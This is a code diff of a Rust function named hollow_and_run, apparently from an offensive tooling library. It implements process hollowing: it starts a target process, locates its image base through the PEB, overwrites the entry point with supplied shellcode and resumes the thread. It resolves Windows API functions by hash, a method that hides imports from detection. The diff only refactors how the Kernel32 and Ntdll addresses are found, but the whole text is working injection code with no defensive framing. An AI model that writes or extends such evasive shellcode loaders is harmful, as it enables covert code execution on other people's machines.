@@ -17,8 +17,11 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // See line 13
     let mut process_information = PROCESS_INFORMATION::default();
 
+    // Get location of Kernel32.dll
+    let kernel32 = rco_utils::find_library_address("Kernel32").unwrap();
+
     // See line 18
-    let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
+    let function = rco_utils::find_function_address(kernel32, 0x6fe222ff0e96f5c4).unwrap();
     let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION]; [BOOL]);
     let lp_command_line = PSTR::from_raw(format!("{target_process}\0").as_mut_ptr());
     unsafe {
@@ -36,8 +39,11 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         )
     };
 
+    // Get location of Ntdll.dll
+    let ntdll = rco_utils::find_library_address("Ntdll").unwrap();
+
     // See line 43
-    let function = rco_utils::find_function_address("Ntdll", 0x9b0d5adddbf90f8a).unwrap();
+    let function = rco_utils::find_function_address(ntdll, 0x9b0d5adddbf90f8a).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32]; [()]);
     let process_handle = process_information.hProcess;
     let mut basic_information = PROCESS_BASIC_INFORMATION::default();
@@ -52,7 +58,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     };
 
     // See line 60
-    let function = rco_utils::find_function_address("Kernel32", 0x1c1cfbf71004cba8).unwrap();
+    let function = rco_utils::find_function_address(kernel32, 0x1c1cfbf71004cba8).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *mut c_void, usize, *mut usize]; [()]);
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
     let mut address_buffer = [0; POINTER_SIZE as usize];
@@ -84,7 +90,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     }
 
     // See line 97
-    let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
+    let function = rco_utils::find_function_address(kernel32, 0x2638fa76194bfe63).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
     let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
@@ -101,7 +107,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     };
 
     // See line 117
-    let function = rco_utils::find_function_address("Kernel32", 0x9f2eb3a0195b21d).unwrap();
+    let function = rco_utils::find_function_address(kernel32, 0x9f2eb3a0195b21d).unwrap();
     let function = rco_utils::construct_win32_function!(function; [HANDLE]; [()]);
     unsafe { function(process_information.hThread) };
 }
